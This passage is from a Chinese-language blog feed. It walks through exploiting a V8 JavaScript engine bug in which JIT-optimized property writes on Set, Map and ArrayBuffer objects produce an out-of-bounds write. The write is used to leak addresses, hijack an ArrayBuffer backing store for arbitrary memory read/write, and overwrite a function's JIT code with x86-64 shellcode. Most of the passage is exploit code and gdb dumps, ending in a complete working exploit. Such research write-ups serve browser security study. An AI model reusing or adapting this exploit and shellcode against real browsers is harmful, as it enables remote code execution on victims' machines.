class="line"><span class="comment">//  - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span></span><br><span class="line"><span class="comment">//  - instance size: 0</span></span><br><span class="line"><span class="comment">//  - elements kind: FAST_HOLEY_ELEMENTS</span></span><br><span class="line"><span class="comment">//  - unused property fields: 0</span></span><br><span class="line"><span class="comment">//  - enum length: invalid</span></span><br><span class="line"><span class="comment">//  - stable_map</span></span><br><span class="line"><span class="comment">//  - back pointer: 0x3817fa502311 &lt;undefined&gt;</span></span><br><span class="line"><span class="comment">//  - instance descriptors (own) #0: 0x3817fa502231 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - layout descriptor: 0</span></span><br><span class="line"><span class="comment">//  - prototype: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - constructor: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - code cache: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - dependent code: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - construction counter: 0</span></span><br></pre></td></tr></table></figure><h3 id="修改null-string的hash字段为ArrayBuffer的length地址"><a href="#修改null-string的hash字段为ArrayBuffer的length地址" class="headerlink" title="修改null string的hash字段为ArrayBuffer的length地址"></a>修改null string的hash字段为ArrayBuffer的length地址</h3><p>这里我再次提醒一下为什么要写入这个地址。<br>之前我们说了，如果写一个smi，可以直接写入，但是如果要写入的数值大于smi，会把该属性字段的值当成一个指针，然后将这个数值写入到那个内存里。<br>就比如，我向null string的map字段（对应于n.xyz)写一个非SMI进去.<br>double类型的3.4766863919152113e-308等于int类型的0x0019000400007300<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x33e606b02241</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x33e606b02240</span>:<span class="number">0x0000081f59a02309</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33e606b02250</span>:<span class="number">0x0000081f59a02361</span>-&gt;n.xyz<span class="number">0x00000000803b1506</span></span><br><span class="line"><span class="number">0x33e606b02260</span>:<span class="number">0x0000700000000000</span><span class="number">0x000017f1e8c36fe96f</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x0000081f59a02361</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x81f59a02360</span>:<span class="number">0x0000081f59a02259</span><span class="number">0x0019000400007300</span>-&gt;被写入的<span class="number">3.4766863919152113e-308</span>即<span class="number">0x0019000400007300</span></span><br><span class="line"><span class="number">0x81f59a02370</span>:<span class="number">0x00000000082003ff</span><span class="number">0x000033e606b02201</span></span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span> <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">m.xyz3 = addr</span><br><span class="line">&#125;</span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x0000108ed87359d9-&gt;ArrayBuffer length的地址</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000-&gt;length</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x000055ba589d0640-&gt;BackingStore</span></span><br></pre></td></tr></table></figure><p><strong>所以说为了写入一个地址到ArrayBuffer的BackingStore，首先将BackingStore向前减去8个字节的地址即length地址写入到hash字段。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073443.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073449.jpg" alt=""></p><h3 id="向null-string的hash字段写入任意值，得到任意地址读写的原语"><a href="#向null-string的hash字段写入任意值，得到任意地址读写的原语" class="headerlink" title="向null string的hash字段写入任意值，得到任意地址读写的原语"></a>向null string的hash字段写入任意值，得到任意地址读写的原语</h3><p>类似于我们上面写map一样，将[length_addr+0x8]即backingstore给覆盖成我们想要写入的内容。<br><strong>在v8里，只要你能修改backingstore的值，就可以进行任意地址读写</strong><br>于是就有了一个任意地址读写的原语。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073824.png" alt=""></p><p><strong>于是我们先将func_addr写到backingstore，读到函数真正执行时候的code地址</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr             </span><br><span class="line">&#125;</span><br><span class="line">Ctor3();</span><br><span class="line">Check3(func_addr_float);</span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x108ed87359c1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c1: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c002db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed8705599</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x108ed8735a00-&gt;已经被改成了Function的地址</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x0000108ed8735a00-&gt;已经被改成了Function的地址0x0000000000000004</span></span><br><span class="line"><span class="comment">// 0x108ed87359f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x0000108ed8735a01-1</span></span><br><span class="line"><span class="comment">// 0x108ed8735a00:0x00002d714c0040f10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed8735a10:0x000037191c9822410x000037191c982351</span></span><br><span class="line"><span class="comment">// 0x108ed8735a20:0x0000108ed872d8490x0000108ed8703951</span></span><br><span class="line"><span class="comment">// 0x108ed8735a30:0x000037191c984b210x000016396d105e00--&gt;shellcode_addr_float[7]</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x0000108ed8735a01</span></span><br><span class="line"><span class="comment">// 0x108ed8735a01: [Function]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c0040f1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed87040b9</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - initial_map = </span></span><br><span class="line"><span class="comment">//  - shared_info = 0x108ed872d849 &lt;SharedFunctionInfo&gt;</span></span><br><span class="line"><span class="comment">//  - name = 0x37191c982471 &lt;String[0]: &gt;</span></span><br><span class="line"><span class="comment">//  - formal_parameter_count = 0</span></span><br><span class="line"><span class="comment">//  - context = 0x108ed8703951 &lt;FixedArray[235]&gt;</span></span><br><span class="line"><span class="comment">//  - literals = 0x37191c984b21 &lt;FixedArray[1]&gt;</span></span><br><span class="line"><span class="comment">//  - code = 0x16396d105da1 &lt;Code: FUNCTION&gt;</span></span><br></pre></td></tr></table></figure><p><strong>再将取得的函数真正执行时候执行的函数地址，写入到backingstore，从而通过它进行任意地址写，写入我们的shellcode</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br></pre></td></tr></table></figure></p><p>然后再执行这个被我们改了内容的函数，就可以弹计算器了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil_f();</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-075203.png" alt=""></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line"><span class="keyword">var</span> m;</span><br><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print("0x"+u2d(3.4766863919133141e-308;</span></span><br><span class="line"><span class="comment">// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&amp;0xffffffff));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span>     <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    m.xyz3 = addr </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// JIT优化</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">    Ctor2();</span><br><span class="line">    Ctor3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Check(<span class="literal">null</span>);</span><br><span class="line">    Check2(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">    Check3(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Ctor2(); <span class="comment">// 初始化m</span></span><br><span class="line">Ctor3(); <span class="comment">// 初始化l</span></span><br><span class="line">print(<span class="string">"jsset is :"</span>);</span><br><span class="line">%DebugPrint(n);</span><br><span class="line"><span class="comment">// %DebugPrint(Check);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点</span></span><br><span class="line">Check(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> ab_len_ptr = ab_addr+<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">ab_len_ptr_float = d2u(ab_len_ptr/<span class="number">0x100000000</span>,ab_len_ptr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">Check(evil_f);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line"><span class="keyword">var</span> func_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+func_addr.toString(<span class="number">16</span>));</span><br><span class="line">func_addr = func_addr - <span class="number">1</span>;</span><br><span class="line">func_addr_float = d2u(func_addr/<span class="number">0x100000000</span>,func_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// %DebugPrint(Check2);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点                 </span></span><br><span class="line"></span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Check3(func_addr_float);</span><br><span class="line"></span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"></span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>star ctf chrome oob writeup</title>
      <link href="/2019/04/29/*ctf_oob/"/>
      <url>/2019/04/29/*ctf_oob/</url>
